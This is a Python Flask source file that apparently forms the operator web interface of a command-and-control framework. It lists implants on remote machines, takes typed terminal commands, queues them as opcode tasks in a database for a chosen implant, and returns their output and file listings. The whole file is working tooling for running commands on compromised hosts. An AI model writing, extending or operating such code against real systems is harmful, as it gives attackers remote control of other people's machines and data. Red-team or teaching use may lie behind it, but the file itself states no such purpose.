# Import necessary modules and libraries
from flask import Blueprint, session, redirect, url_for, render_template, request, jsonify
from cvnt.db_operations import get_list, make_task
from wtforms import SelectField
from cvnt.blueprint_terminal import Terminal, analyze_input
from flask_wtf import FlaskForm
import os
from cvnt.client_pb2 import *
from time import sleep
import random
from cvnt.constants import *
from cvnt.database import db
from cvnt.implant_pb2 import TaskRequest, TaskResponse



explorer = Blueprint('explorer', __name__, template_folder='templates', static_folder='static')

# Define the Menu form class
class Menu(FlaskForm):
    selected_implant = SelectField('Select Implant', choices=[])

@explorer.route('/explorer')
def root():
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('basic.login_success'))

    implant_id = "slayyy"
    implants = get_list()
    menu = Menu()
    menu.selected_implant.choices = implants
    form = Terminal()
    file_list = analyze_input(form, implant_id)

    return render_template('explorer.html', current_working_directory='.', form=menu,
                           file_list=file_list, implants=implants, implant_id=implant_id)

@explorer.route('/change_implant', methods=['POST'])
def change_implant():
    implant_id = request.json['implant_id']
    form = Terminal()
    form.cmd.data = 'dir'  # Simulate 'dir' command
    file_list = analyze_input(form, implant_id)

    file_list_items = []
    for item in file_list:
        file_list_items.append({
            'name': item,
            'is_dir': '<DIR>' in item,
            'is_file': any(ext in item for ext in ['.txt', '.py', '.json'])
        })

    # Log the response for debugging
    return jsonify(file_list=file_list_items)

def analyze_input(form, implant_id):
    whole = form.cmd.data
    if whole is None:   
        response = ["please enter command"]
    else: 
    #if len(words) == 1:
        #if words[0] == 'dir':
        main_op = OPCODE_STDLIB
        rest_string = str(to_opcode(whole))
        new_task = handle_task_request(implant_id, main_op, rest_string)
        sleep(5)
        response = new_task.task_output.split('\n')
        #else:
           # response = 
    return response

def handle_task_request(implant_id, cmd, args):
    tr = TaskRequest()
    tr.TaskID = random.randint(10, 10000)
    tr.Opcode = cmd
    tr.Args = args
    new_task = make_task(implant_id, tr)
    db.session.add(new_task)
    db.session.commit()
    return new_task

